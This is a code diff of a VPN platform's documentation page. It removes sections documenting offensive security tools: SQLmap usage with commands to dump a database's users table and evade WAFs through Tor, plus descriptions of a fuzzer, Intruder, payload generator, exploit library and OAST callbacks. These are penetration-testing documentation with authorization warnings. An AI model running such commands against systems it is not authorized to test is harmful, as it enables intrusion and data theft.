@@ -65,7 +65,7 @@ const SECTIONS: Section[] = [
     id: "overview", title: "Platform Overview", icon: BookOpen,
     content: (
       <div className="space-y-3">
-        <p>ProxhqVPN is a fully self-hosted, enterprise-grade VPN platform built by <strong>ALPHA UNLIMITED TECHNOLOGIES LLC</strong>. It combines WireGuard's modern cryptography (AES-256-GCM, ChaCha20-Poly1305) with double-hop routing via VPN Gate, a SilkWeb honeypot mesh for active threat detection, an integrated Alpha Toolkit for advanced security research, and automatic IP whitelisting to prevent lockouts.</p>
+        <p>ProxhqVPN is a fully self-hosted, enterprise-grade VPN platform built by <strong>ALPHA UNLIMITED TECHNOLOGIES LLC</strong>. It combines WireGuard's modern cryptography (AES-256-GCM, ChaCha20-Poly1305) with double-hop routing via VPN Gate, a SilkWeb honeypot mesh for active threat detection, and automatic IP whitelisting to prevent lockouts.</p>
         <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 mt-3">
           {[
             { t: "WireGuard Core", d: "Modern VPN protocol with AES-256-GCM. Fastest and most secure available." },
@@ -79,9 +79,7 @@ const SECTIONS: Section[] = [
             { t: "Security Hardening v2.1.0", d: "6 vulnerabilities patched: timing-safe secret comparison, SSL MitM prevention, shell-chain injection blocking, SSRF redirect re-validation, IP auto-ban (20 failures → 30-min block), WAF double-decode bypass protection. Desktop v2.1.0 adds TLS certificate pinning." },
             { t: "OSINT Recon Engine", d: "15+ passive intelligence sources (Shodan, Censys, AbuseIPDB, CT logs, HaveIBeenPwned) queried in parallel, all routed through the VPN." },
             { t: "Canary Tokens", d: "Invisible tripwires — HTTP URLs, DNS tokens, document beacons, AWS fake keys — that alert you the instant someone accesses them." },
-            { t: "Ghost Chain Exploit Arsenal", d: "200+ categorized exploits (SQLi, XSS, RCE, SSRF, XXE, JWT, deserialization) with Details and PoC code tabs. Integrates with HTTP Probe and Intruder." },
             { t: "Exploit Importer", d: "Upload Nessus, Burp, Nikto, ZAP, or OpenVAS reports (ZIP auto-extracted). 30+ pattern categories extract findings with severity scoring and PoC code." },
-            { t: "Alpha Toolkit", d: "Universal Scanner, Vuln Verifier, Web Scraper — all Tor-cloakable." },
             { t: "Kill Switch + Auto-IP", d: "Block all traffic if VPN drops. Your real IP is auto-detected and whitelisted so you never lose remote access." },
           ].map(({ t, d }) => (
             <div key={t} className="border border-primary/15 rounded p-3">
@@ -512,7 +510,7 @@ ip route show table 100  # See ProxhqVPN routing table`}</CB>
           <div>1. SilkWeb traps listen on commonly-scanned ports (22, 80, 443, 3306, 5432, 6379, 27017).</div>
           <div>2. When an attacker connects, SilkWeb accepts the connection and logs every keystroke, payload, and command.</div>
           <div>3. The attacker's IP, fingerprint, and tools are captured and automatically added to the firewall blocklist.</div>
-          <div>4. Advanced traps run nmap and SQLmap back against the attacker to identify their infrastructure.</div>
+          <div>4. Advanced traps record attacker infrastructure details for threat intelligence.</div>
         </div>
         <h4 className="font-bold text-primary text-[11px] mt-3">Running a Port Scan on a Trapped IP</h4>
         <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
@@ -678,132 +676,6 @@ whois target.com                 # WHOIS data`}</CB>
     ),
   },
   {
-    id: "sqlmap", title: "SQLmap Vulnerability Scanner", icon: ScanSearch,
-    content: (
-      <div className="space-y-4">
-        <p>The <strong>SQLmap Scanner</strong> (<code>/sqlmap</code>) is a full integration of the SQLmap automatic SQL injection detection and exploitation tool, accessible from the ProxhqVPN dashboard. All scans can be routed through Tor.</p>
-        <Note type="danger">Only scan targets you own or have explicit written permission to test. Unauthorized scanning is illegal.</Note>
-        <h4 className="font-bold text-primary text-[11px]">Running a Scan from the UI</h4>
-        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
-          <li><span className="text-primary/30">1.</span> Go to <strong>Vulnerability Scanner</strong> → enter the target URL.</li>
-          <li><span className="text-primary/30">2.</span> Set the scan options (level, risk, technique, DBMS type).</li>
-          <li><span className="text-primary/30">3.</span> Toggle <strong>Use Tor</strong> to route through Tor SOCKS5 (127.0.0.1:9050).</li>
-          <li><span className="text-primary/30">4.</span> Click <strong>Start Scan</strong> — results stream in as SQLmap finds injections.</li>
-        </ol>
-        <h4 className="font-bold text-primary text-[11px] mt-2">SQLmap Command Reference</h4>
-        <CB label="basic get parameter test">{`sqlmap -u "https://target.com/page.php?id=1" --batch --dbs`}</CB>
-        <CB label="test post form">{`sqlmap -u "https://target.com/login" \
-  --data="username=admin&password=test" \
-  --method POST \
-  --batch --dbs`}</CB>
-        <CB label="via tor (always recommended)">{`sqlmap -u "https://target.com/page.php?id=1" \
-  --tor \
-  --tor-type=SOCKS5 \
-  --tor-port=9050 \
-  --batch --dbs`}</CB>
-        <CB label="dump specific database table">{`sqlmap -u "https://target.com/page.php?id=1" \
-  --dbms=mysql \
-  -D target_db \
-  -T users \
-  --dump \
-  --batch`}</CB>
-        <CB label="detect waf and bypass">{`sqlmap -u "https://target.com/page.php?id=1" \
-  --identify-waf \
-  --tamper=space2comment,charencode,randomcase \
-  --level=5 --risk=3 \
-  --batch --dbs`}</CB>
-        <h4 className="font-bold text-primary text-[11px] mt-3">SQLmap Flags Reference</h4>
-        <div className="space-y-1.5 text-[9px] font-mono">
-          {[
-            ["--level=1-5", "Test depth. 1=basic, 5=all possible injection points."],
-            ["--risk=1-3", "Risk of damage. 1=safe, 3=includes heavy queries (may break DBs)."],
-            ["--technique=BEUSTQ", "B=boolean, E=error, U=union, S=stacked, T=time, Q=inline."],
-            ["--tamper=SCRIPT", "Apply evasion transforms (space2comment, charencode, etc)."],
-            ["--dbms=TYPE", "Target specific DBMS: mysql, postgres, mssql, oracle, sqlite."],
-            ["--dump-all", "Dump every database, table, and column (use carefully)."],
-            ["--batch", "Non-interactive mode. Auto-answer all prompts with defaults."],
-            ["--threads=N", "Parallel requests. Max 10 recommended."],
-            ["--delay=N", "Seconds between requests. Use with sensitive targets."],
-            ["--proxy=URL", "Route through a proxy (e.g. Burp: http://127.0.0.1:8080)."],
-          ].map(([flag, desc]) => (
-            <div key={flag} className="flex gap-3 border border-primary/10 rounded px-2 py-1">
-              <code className="text-green-400/80 shrink-0 w-48">{flag}</code>
-              <span className="text-primary/83">{desc}</span>
-            </div>
-          ))}
-        </div>
-      </div>
-    ),
-  },
-  {
-    id: "alphatools", title: "Alpha Toolkit", icon: Layers,
-    content: (
-      <div className="space-y-4">
-        <p>The <strong>Alpha Toolkit</strong> (<code>/alpha-tools</code>) provides three advanced security research engines with a seamless Scanner → Verifier pipeline, all optionally routed through Tor. Available to Command Center Pro subscribers and all employees.</p>
-
-        <h4 className="font-bold text-primary text-[11px]">Tool 1 — Universal Scanner</h4>
-        <p className="text-[10px] font-mono text-primary/83">Alpha Scanner v4.0 supports 35+ programming languages, 200+ vulnerability patterns, multi-step exploit chain detection, network port scanning, service fingerprinting, and secret/credential detection.</p>
-        <div className="space-y-2">
-          {[
-            { m: "Network Scan", d: "Port scanning + service fingerprinting + banner grabbing via nmap integration." },
-            { m: "Security Audit", d: "Scan source code or config files for hardcoded secrets, weak keys, misconfigs, exposed credentials." },
-            { m: "Exploit Scan", d: "200+ vulnerability patterns: SQLi, XSS, SSTI, SSRF, path traversal, deserialization, RCE chains." },
-            { m: "Full Scan", d: "Runs all three modes sequentially. Generates a comprehensive HTML report." },
-          ].map(({ m, d }) => (
-            <div key={m} className="border border-primary/10 rounded px-3 py-2">
-              <div className="text-[10px] font-mono font-bold text-primary">{m}</div>
-              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
-            </div>
-          ))}
-        </div>
-        <CB label="scanner workflow">{`1. Enter Target IP/Hostname (network/all mode) or Path/URL (security/exploit mode)
-2. Set port range for network scans (default: 1-10000)
-3. Add extra flags: --lang cpp  --deep  --config-audit
-4. Toggle Tor Cloak to route scan through Tor
-5. Click Run Scanner → monitor live output in terminal
-6. When complete: click Download HTML Report or Send to Verifier`}</CB>
-
-        <h4 className="font-bold text-primary text-[11px] mt-3">Tool 2 — Vulnerability Verifier</h4>
-        <p className="text-[10px] font-mono text-primary/83">The Verifier takes the Alpha Scanner HTML report and <strong>actively probes every finding against the live target</strong>. It performs TLS handshakes, TCP banner grabs, HTTP header analysis, SQL error probes, SSRF checks, and CDN false-positive filtering.</p>
-        <CB label="scanner → verifier pipeline">{`Step 1: Run Universal Scanner → wait for completion
-Step 2: Click "Send to Verifier" (green button)
-         → App switches to Verifier tab automatically
-         → HTML report is pre-loaded (~N KB)
-Step 3: Optionally set a Target URL override
-Step 4: Toggle Tor Cloak for anonymous probing
-Step 5: Click "Verify Findings"
-Step 6: Results show:
-         - Exposed findings with captured evidence
-         - False positive count
-         - CDN detection warning if applicable
-         - Downloadable color-coded Exposure Report`}</CB>
-
-        <h4 className="font-bold text-primary text-[11px] mt-3">Tool 3 — Web Scraper</h4>
-        <p className="text-[10px] font-mono text-primary/83">Alpha Web Scraper runs entirely in the browser and stores everything in a local SQLite database. It captures pages, links, emails, phone numbers, OpenGraph metadata, JSON-LD structured data, forms, and file assets into 14 queryable tables.</p>
-        <CB label="what the scraper captures">{`Table: pages         → URL, title, meta description, HTML, status code
-Table: links         → All href links (internal + external) with anchor text
-Table: emails        → All email addresses found on any scraped page
-Table: phones        → Phone numbers extracted via regex
-Table: images        → Image URLs and alt text
-Table: forms         → Form actions, methods, and all input field names
-Table: opengraph     → og:title, og:image, og:description, og:type
-Table: jsonld        → JSON-LD structured data blocks
-Table: headers       → HTTP response headers per page
-Table: cookies       → Cookie names, values, flags (HttpOnly, Secure)
-Table: scripts       → External script URLs loaded per page
-Table: stylesheets   → External CSS URLs
-Table: assets        → Other assets (fonts, media, PDFs, etc.)
-Table: metadata      → Crawl session info, start time, depth`}</CB>
-        <div className="text-[9px] font-mono text-primary/83 border border-primary/10 rounded px-3 py-2">
-          Export all data as <strong>.sqlite</strong> (open in DB Browser for SQLite), <strong>CSV</strong> (per table), or <strong>JSON</strong>. Enable Tor Mode inside the scraper (top-right toggle) to route all fetch requests through Tor circuits.
-        </div>
-
-        <h4 className="font-bold text-primary text-[11px] mt-3">Global Tor Cloak</h4>
-        <p className="text-[10px] font-mono text-primary/83">The <strong>Tor Cloak</strong> toggle at the top of the Alpha Toolkit page routes ALL tools (Scanner, Verifier, nmap, SQLmap) through the Tor daemon at 127.0.0.1:9050. The Tor badge shows your current exit IP — verify it's a Tor exit node before running any scans.</p>
-      </div>
-    ),
-  },
-  {
     id: "securityaudit", title: "Security Audit (Admin)", icon: Lock,
     content: (
       <div className="space-y-3">
@@ -912,79 +784,6 @@ Table: metadata      → Crawl session info, start time, depth`}</CB>
     ),
   },
   {
-    id: "dirfuzzer", title: "Directory Fuzzer", icon: FolderSearch,
-    content: (
-      <div className="space-y-3">
-        <p>The <strong>Directory Fuzzer</strong> (<code>/dir-fuzzer</code>) brute-forces hidden files and directories on web servers using customizable wordlists. Equivalent to ffuf or gobuster. Command Center Pro only.</p>
-        <h4 className="font-bold text-primary text-[11px]">How to Run a Directory Fuzz</h4>
-        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
-          <li><span className="text-primary/30">1.</span> Enter the target URL (e.g. <code>https://target.com/</code>).</li>
-          <li><span className="text-primary/30">2.</span> Choose a wordlist: <strong>Common</strong> (admin panels, backups), <strong>API Routes</strong>, <strong>Git/Config Files</strong>, or upload a custom list.</li>
-          <li><span className="text-primary/30">3.</span> Set the file extensions to append (e.g. <code>.php, .bak, .old, .zip</code>).</li>
-          <li><span className="text-primary/30">4.</span> Set the thread count and delay. Higher threads = faster but more detectable.</li>
-          <li><span className="text-primary/30">5.</span> Toggle <strong>Tor Mode</strong> to route requests anonymously.</li>
-          <li><span className="text-primary/30">6.</span> Click <strong>Start Fuzz</strong> — discovered paths stream in real-time.</li>
-        </ol>
-        <Note type="warn">Fuzzing sends hundreds or thousands of requests per minute. This may trigger WAFs, rate limiting, or alert the target's monitoring systems.</Note>
-      </div>
-    ),
-  },
-  {
-    id: "subdomains", title: "Subdomain Scout", icon: Radar,
-    content: (
-      <div className="space-y-3">
-        <p>The <strong>Subdomain Scout</strong> (<code>/subdomain-scan</code>) enumerates subdomains of a target domain using multiple passive and active techniques. Command Center Pro only.</p>
-        <h4 className="font-bold text-primary text-[11px]">Enumeration Methods</h4>
-        <div className="space-y-2">
-          {[
-            { t: "Certificate Transparency (CT Logs)", d: "Query crt.sh and other CT log aggregators for every SSL certificate ever issued for the domain. Purely passive — never touches the target." },
-            { t: "DNS Brute-Force", d: "Send DNS resolution requests for common subdomain patterns (www, api, dev, staging, mail, cdn, etc.)." },
-            { t: "Reverse DNS / ASN Lookup", d: "Identify all IPs owned by the target's ASN and attempt reverse DNS resolution to find additional hosts." },
-          ].map(({ t, d }) => (
-            <div key={t} className="border border-primary/10 rounded px-3 py-2">
-              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
-              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
-            </div>
-          ))}
-        </div>
-        <h4 className="font-bold text-primary text-[11px] mt-3">Export Results</h4>
-        <p className="text-[10px] font-mono text-primary/83">Export discovered subdomains as a plain text list or JSON. Send directly to the Security Audit tool for a quick TLS/header check across all found domains.</p>
-        <Note type="info">CT log enumeration is always anonymous — it never contacts the target domain. DNS brute-force sends packets to your DNS resolver, not to the target directly.</Note>
-      </div>
-    ),
-  },
-  {
-    id: "intruder", title: "Intruder", icon: Swords,
-    content: (
-      <div className="space-y-3">
-        <p>The <strong>Intruder</strong> (<code>/intruder</code>) automates parameter fuzzing across multiple payload sets. Modeled after Burp Intruder — inject payloads at any marked position in a request template. Command Center Pro only.</p>
-        <h4 className="font-bold text-primary text-[11px]">Attack Modes</h4>
-        <div className="space-y-2">
-          {[
-            { t: "Sniper", d: "One payload set. Injects each payload into one position at a time, cycling through all positions sequentially. Best for single-parameter fuzzing." },
-            { t: "Battering Ram", d: "One payload set. Injects the same payload into all marked positions simultaneously. Good for testing multi-parameter forms." },
-            { t: "Pitchfork", d: "Multiple payload sets (one per position). Iterates all sets in parallel — position 1 gets payload 1[n], position 2 gets payload 2[n]." },
-            { t: "Cluster Bomb", d: "Multiple payload sets. Tries every combination of all payloads across all positions. Highest coverage, highest request count." },
-          ].map(({ t, d }) => (
-            <div key={t} className="border border-primary/10 rounded px-3 py-2">
-              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
-              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
-            </div>
-          ))}
-        </div>
-        <h4 className="font-bold text-primary text-[11px] mt-3">Using Intruder</h4>
-        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
-          <li><span className="text-primary/30">1.</span> Paste a raw HTTP request or set a base URL + params.</li>
-          <li><span className="text-primary/30">2.</span> Mark injection positions with <code>§ § </code> delimiters.</li>
-          <li><span className="text-primary/30">3.</span> Load a payload list (paste custom list, use a built-in wordlist, or pull from Payload Generator).</li>
-          <li><span className="text-primary/30">4.</span> Set concurrency and delay. Enable Tor for anonymous fuzzing.</li>
-          <li><span className="text-primary/30">5.</span> Click <strong>Start Attack</strong>. Filter results by response length, status code, or keywords to find anomalies.</li>
-        </ol>
-        <Note type="danger">Intruder can send thousands of requests quickly. Only use on targets you are authorized to test.</Note>
-      </div>
-    ),
-  },
-  {
     id: "encoder", title: "Encoder / Decoder", icon: Code2,
     content: (
       <div className="space-y-3">
@@ -1031,32 +830,6 @@ Table: metadata      → Crawl session info, start time, depth`}</CB>
           <div>• <strong>Bytes</strong> — byte-level diff for binary responses</div>
           <div>• <strong>Ignore</strong> — optionally ignore headers, timestamps, session IDs</div>
         </div>
-      </div>
-    ),
-  },
-  {
-    id: "payloads", title: "Payload Generator", icon: Bug,
-    content: (
-      <div className="space-y-3">
-        <p>The <strong>Payload Generator</strong> (<code>/payloads</code>) provides categorized, ready-to-use attack payloads for security testing. Command Center Pro only.</p>
-        <h4 className="font-bold text-primary text-[11px]">Payload Categories</h4>
-        <div className="grid grid-cols-2 gap-2">
-          {[
-            { cat: "Injection", items: ["SQL Injection (MySQL, Postgres, MSSQL, Oracle)", "XSS (reflected, stored, DOM, polyglots)", "Server-Side Template Injection (SSTI)", "LDAP Injection", "Command Injection"] },
-            { cat: "Server-Side", items: ["SSRF (localhost, cloud metadata endpoints)", "XXE (XML External Entity)", "Path Traversal / LFI", "Deserialization (Java, PHP, Python)", "RCE via Log4j"] },
-            { cat: "Evasion", items: ["WAF bypass variants (encoding, case mangling)", "Filter bypass payloads", "Null byte injection", "Unicode normalization attacks"] },
-            { cat: "Recon", items: ["Wordlists (admin, backup, API, upload dirs)", "Common credential pairs", "Default password lists", "JWT secret brute-force lists"] },
-            { cat: "Windows Reserved Names", items: ["CON, NUL, AUX, PRN with arbitrary extensions (.txt/.php/.exe)", "COM1–COM9 and LPT1–LPT9 device names", "Encoded variants: URL-encoded, double URL-encoded", "JSON and multipart/form-data payload wrapping", "ZIP archive filename injection (24 payloads total)"] },
-            { cat: "Parser Confusion", items: ["Nested HTML/script tag splitting", "MathML expression injection", "SVG foreignObject XSS carrier", "Legacy Yahoo-booter script patterns", "Script-within-script polyglots (24 payloads total)"] },
-          ].map(({ cat, items }) => (
-            <div key={cat} className="border border-primary/10 rounded px-2.5 py-2">
-              <div className="text-[10px] font-mono font-bold text-primary mb-1">{cat}</div>
-              {items.map(i => <div key={i} className="text-[9px] font-mono text-primary/83">• {i}</div>)}
-            </div>
-          ))}
-        </div>
-        <h4 className="font-bold text-primary text-[11px] mt-3">Sending Payloads to Other Tools</h4>
-        <p className="text-[10px] font-mono text-primary/83">Click <strong>Send to HTTP Probe</strong> to test a payload directly, or <strong>Send to Intruder</strong> to use the payload list as input for an automated attack run. The <strong>Copy All</strong> button copies every payload in the selected category as newline-separated text for use in external tools like ffuf, sqlmap, or Burp Suite.</p>
       </div>
     ),
   },
@@ -1287,93 +1060,6 @@ Table: metadata      → Crawl session info, start time, depth`}</CB>
     ),
   },
   {
-    id: "ghostchain", title: "Ghost Chain Exploit Arsenal", icon: GitMerge,
-    content: (
-      <div className="space-y-3">
-        <p>The <strong>Ghost Chain</strong> (<code>/ghost-chain</code>) is ProxhqVPN's integrated exploit reference library and attack chain builder. Select a vulnerability category, browse 200+ exploit techniques, and get ready-to-use PoC code for each. All traffic is routed through the VPN tunnel. Command Center Pro only.</p>
-        <h4 className="font-bold text-primary text-[11px]">Exploit Categories</h4>
-        <div className="grid grid-cols-2 gap-2">
-          {[
-            { cat: "Injection", items: ["SQL Injection (blind, UNION, error-based, OOB)", "XSS (reflected, stored, DOM, CSP bypass)", "Server-Side Template Injection (Jinja2, Twig, Freemarker)", "Command Injection (Linux, Windows, PowerShell)", "LDAP / NoSQL / XPATH Injection"] },
-            { cat: "Server-Side Vulnerabilities", items: ["SSRF (internal services, cloud metadata, SSRF-to-RCE chains)", "XXE (file read, SSRF via XXE, OOB XXE)", "Deserialization (Java gadget chains, PHP unserialize, Python pickle)", "Path Traversal / LFI (directory traversal, null byte, log poisoning)", "RCE via Log4Shell / Spring4Shell"] },
-            { cat: "Authentication & Tokens", items: ["JWT attacks (alg:none, HMAC confusion, kid injection)", "OAuth 2.0 flaws (open redirect, state fixation)", "Password reset poisoning", "Broken SAML assertions", "API key bruteforce patterns"] },
-            { cat: "Web & Protocol Attacks", items: ["CORS misconfiguration exploitation", "HTTP Request Smuggling (CL.TE, TE.CL)", "WebSocket hijacking", "Cache poisoning", "Subdomain takeover chains"] },
-          ].map(({ cat, items }) => (
-            <div key={cat} className="border border-primary/10 rounded px-2.5 py-2">
-              <div className="text-[10px] font-mono font-bold text-primary mb-1">{cat}</div>
-              {items.map(i => <div key={i} className="text-[9px] font-mono text-primary/83">• {i}</div>)}
-            </div>
-          ))}
-        </div>
-        <h4 className="font-bold text-primary text-[11px] mt-3">PoC Code Tabs</h4>
-        <p className="text-[10px] font-mono text-primary/83">Each exploit entry has two tabs: <strong>Details</strong> (technique description, CVE references, how the vulnerability works, real-world examples) and <strong>Exploit PoC</strong> (copy-ready attack code in the appropriate language — Python, Bash, JavaScript, SQL, XML, or YAML). One-click copy button on every code block.</p>
-        <h4 className="font-bold text-primary text-[11px] mt-3">Send to Other Tools</h4>
-        <p className="text-[10px] font-mono text-primary/83">Click <strong>Send to HTTP Probe</strong> from any exploit to pre-fill the payload in the HTTP Probe tool. Click <strong>Send to Intruder</strong> to use a payload list for automated fuzzing. Ghost Chain integrates directly with the rest of the Command Center toolkit.</p>
-      </div>
-    ),
-  },
-  {
-    id: "exploitimporter", title: "Exploit Importer", icon: Upload,
-    content: (
-      <div className="space-y-3">
-        <p>The <strong>Exploit Importer</strong> (<code>/exploit-import</code>) parses external vulnerability scan reports — from Nessus, Burp Suite, Nikto, ZAP, OpenVAS, or any text-based output — and extracts structured exploit findings with severity ratings, CVE IDs, ready-to-use PoC code, and complete step-by-step exploitation guides for each vulnerability type. Command Center Pro only.</p>
-        <h4 className="font-bold text-primary text-[11px]">Two Input Methods</h4>
-        <div className="space-y-2">
-          {[
-            { t: "Paste Text", d: "Paste raw scanner output, copy-pasted Burp Suite findings, manual notes, or any text mentioning vulnerability keywords. The parser extracts all recognizable vulnerability patterns." },
-            { t: "Upload File", d: "Drag-and-drop or browse for a file. Supported: .txt, .log, .html, .htm, .xml, .nessus, .json, .zip. ZIP archives are automatically extracted — every readable file inside is parsed." },
-          ].map(({ t, d }) => (
-            <div key={t} className="border border-primary/10 rounded px-3 py-2">
-              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
-              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
-            </div>
-          ))}
-        </div>
-        <h4 className="font-bold text-primary text-[11px] mt-3">Detection Patterns (30+ Categories)</h4>
-        <div className="grid grid-cols-2 gap-2">
-          {[
-            { cat: "Injection", items: ["SQL Injection (blind, UNION, error, OOB)", "XSS (reflected/stored/DOM)", "Command Injection", "SSTI (Jinja2, Twig, FreeMarker, ERB)", "LDAP / NoSQL Injection"] },
-            { cat: "Server-Side", items: ["SSRF (internal services, cloud metadata)", "XXE (file read, SSRF via XXE)", "LFI / Path Traversal", "RCE / Remote Code Execution", "Java / PHP / Python Deserialization"] },
-            { cat: "Auth & Tokens", items: ["JWT Vulnerabilities (alg:none, confusion)", "IDOR (object-level auth bypass)", "CSRF", "Auth Bypass (SQLi in login, param tamper)", "Default & Weak Credentials"] },
-            { cat: "Exposure & Config", items: ["Exposed .env / .git repositories", "Hardcoded Secrets & API Keys", "Open Swagger UI / Spring Actuator", "No Rate Limiting", "Weak TLS / Missing Security Headers"] },
-            { cat: "API & GraphQL", items: ["CORS Wildcard / Origin Reflection", "Mass Assignment (over-posting)", "GraphQL Introspection + IDOR", "Open Redirect", "Buffer Overflow"] },
-            { cat: "CVE-Based", items: ["Named CVE findings (auto-linked to NVD)", "Log4Shell, Spring4Shell, ProxyLogon", "Nuclei template matching", "Metasploit module recommendations"] },
-          ].map(({ cat, items }) => (
-            <div key={cat} className="border border-primary/10 rounded px-2.5 py-2">
-              <div className="text-[10px] font-mono font-bold text-primary mb-1">{cat}</div>
-              {items.map(i => <div key={i} className="text-[9px] font-mono text-primary/83">• {i}</div>)}
-            </div>
-          ))}
-        </div>
-        <h4 className="font-bold text-primary text-[11px] mt-3">Three-Tab Result Cards</h4>
-        <div className="space-y-2">
-          {[
-            { t: "Details Tab", d: "Full evidence text extracted from the scanner report, CVE IDs hyperlinked to NVD, and severity badge. This is the raw finding context from your uploaded file." },
-            { t: "Instructions Tab", d: "Complete step-by-step exploitation guide for this exact vulnerability type. Includes: Impact summary, tools required with install commands, before-you-start checklist, numbered attack walkthrough with commands, how to verify it worked, and how to fix it with corrected code examples. Powered by the built-in 24-vulnerability guide library." },
-            { t: "Exploit Code Tab", d: "Ready-to-use PoC attack code (Python, Bash, SQL, JavaScript, XML, YAML) specific to the finding type. One-click copy to clipboard." },
-          ].map(({ t, d }) => (
-            <div key={t} className="border border-primary/10 rounded px-3 py-2">
-              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
-              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
-            </div>
-          ))}
-        </div>
-        <h4 className="font-bold text-primary text-[11px] mt-3">Download Full Report</h4>
-        <p className="text-[10px] font-mono text-primary/83">After scanning, click the green <strong>Download Full Report</strong> button in the results header. A comprehensive <code>.md</code> (Markdown) report is generated on the spot and downloaded to your device. The report includes:</p>
-        <div className="space-y-1 text-[10px] font-mono text-primary/83 ml-2">
-          <div>• Executive summary table (finding count by severity)</div>
-          <div>• Per-finding section with full evidence, CVE IDs, impact rating</div>
-          <div>• Complete exploitation guide (all tools, prerequisites, step-by-step commands)</div>
-          <div>• How-to-verify section for each vulnerability</div>
-          <div>• Full remediation with corrected code examples</div>
-          <div>• Reference links (PortSwigger, OWASP, NVD) for further reading</div>
-        </div>
-        <Note type="info">The parser strips HTML tags from Burp/Nessus HTML exports automatically. Nessus XML (.nessus) plugin IDs are cross-referenced to CVE IDs and the NVD severity scale.</Note>
-        <Note type="warn">All exploit guides and PoC code are for authorized security testing only. Only test against systems you own or have explicit written permission to test.</Note>
-      </div>
-    ),
-  },
-  {
     id: "vulnguides", title: "Vulnerability Instruction Library", icon: BookOpen,
     content: (
       <div className="space-y-3">
@@ -1579,32 +1265,6 @@ Table: metadata      → Crawl session info, start time, depth`}</CB>
     ),
   },
   {
-    id: "oast-tester", title: "OAST Tester", icon: Crosshair,
-    content: (
-      <div className="space-y-3">
-        <p><strong>Out-of-Band Application Security Testing.</strong> OAST Tester generates unique callback payloads that a vulnerable target application will contact, proving blind injection vulnerabilities that produce no visible output. Powered by interactsh.</p>
-        <Note type="danger">OAST payloads must only be injected into systems you own or have explicit written authorization to test. Unauthorized testing violates the CFAA and Computer Misuse Act.</Note>
-        <h4 className="font-bold text-primary text-[11px]">What It Detects</h4>
-        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
-          <div>• <strong>Blind SSRF</strong>: Server fetches your callback URL when processing user input.</div>
-          <div>• <strong>Blind XXE</strong>: XML parser resolves your DNS/HTTP callback entity.</div>
-          <div>• <strong>Blind command injection</strong>: Server executes <code>curl</code> or <code>nslookup</code> to your endpoint.</div>
-          <div>• <strong>Blind SQL injection (OOB)</strong>: Database resolves DNS lookups (SQL Server <code>xp_dirtree</code>, MySQL DNS UDF).</div>
-          <div>• <strong>Log4Shell / JNDI injection</strong>: JNDI LDAP callback proves exploitation.</div>
-        </div>
-        <h4 className="font-bold text-primary text-[11px] mt-3">How to Use</h4>
-        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
-          <li><span className="text-primary/30">1.</span> Navigate to <strong>OAST Tester</strong> (<code>/oast-tester</code>).</li>
-          <li><span className="text-primary/30">2.</span> Click <strong>Generate Callback</strong> — a unique interactsh subdomain is created (e.g., <code>abc123.oast.proxhqvpn.com</code>).</li>
-          <li><span className="text-primary/30">3.</span> Copy the payload for your injection point: HTTP URL, DNS nslookup, JNDI string, or SMTP address.</li>
-          <li><span className="text-primary/30">4.</span> Inject the payload into the target (URL parameter, header, XML body, JSON field, etc.).</li>
-          <li><span className="text-primary/30">5.</span> Watch the <strong>Live Interactions</strong> panel — any callback appears within seconds with timestamp, source IP, and raw payload.</li>
-          <li><span className="text-primary/30">6.</span> A live callback confirms the vulnerability is exploitable out-of-band.</li>
-        </ol>
-      </div>
-    ),
-  },
-  {
     id: "dep-scanner", title: "Dependency Scanner", icon: GitMerge,
     content: (
       <div className="space-y-3">
@@ -1633,36 +1293,6 @@ Table: metadata      → Crawl session info, start time, depth`}</CB>
           <li><span className="text-primary/30">5.</span> Click <strong>Export Report</strong> to download findings as CSV or JSON.</li>
         </ol>
         <Note type="info">Data sources include NVD, GitHub Advisory Database, OSV (Open Source Vulnerabilities), and Snyk Vulnerability DB — cross-referenced for maximum coverage.</Note>
-      </div>
-    ),
-  },
-  {
-    id: "token-seq", title: "Token Sequencer", icon: Key,
-    content: (
-      <div className="space-y-3">
-        <p>Token Sequencer captures session tokens or other application-generated values and performs statistical entropy analysis to detect predictability weaknesses that could allow token forgery.</p>
-        <h4 className="font-bold text-primary text-[11px]">What It Tests</h4>
-        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
-          <div>• <strong>Randomness quality</strong>: Measures bits of entropy (OWASP recommends ≥128 bits for session tokens).</div>
-          <div>• <strong>Pattern detection</strong>: Detects sequential IDs, timestamp-based tokens, and base64-encoded integers.</div>
-          <div>• <strong>Character space analysis</strong>: Identifies if the token alphabet limits effective entropy.</div>
-          <div>• <strong>Prediction feasibility</strong>: For weak tokens, estimates how many attempts are needed to guess a valid token.</div>
-        </div>
-        <h4 className="font-bold text-primary text-[11px] mt-3">How to Use</h4>
-        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
-          <li><span className="text-primary/30">1.</span> Navigate to <strong>Token Sequencer</strong> (<code>/token-seq</code>).</li>
-          <li><span className="text-primary/30">2.</span> Collect token samples from your target: session cookies, CSRF tokens, API keys, password reset tokens. Minimum 100 samples; 500+ recommended.</li>
-          <li><span className="text-primary/30">3.</span> Paste the token list (one per line) and click <strong>Analyze</strong>.</li>
-          <li><span className="text-primary/30">4.</span> Review the entropy estimate, pattern signature, and risk rating: <strong>SAFE / WEAK / VULNERABLE</strong>.</li>
-          <li><span className="text-primary/30">5.</span> For WEAK or VULNERABLE tokens, use the <strong>Prediction Attack</strong> tab to generate candidate tokens from the observed pattern (authorized testing only).</li>
-        </ol>
-        <h4 className="font-bold text-primary text-[11px] mt-3">Interpretation Guide</h4>
-        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
-          <div>• <span className="text-green-400">&gt;128 bits</span>: Safe for session tokens.</div>
-          <div>• <span className="text-amber-400">64–128 bits</span>: Marginal — acceptable only for low-risk tokens.</div>
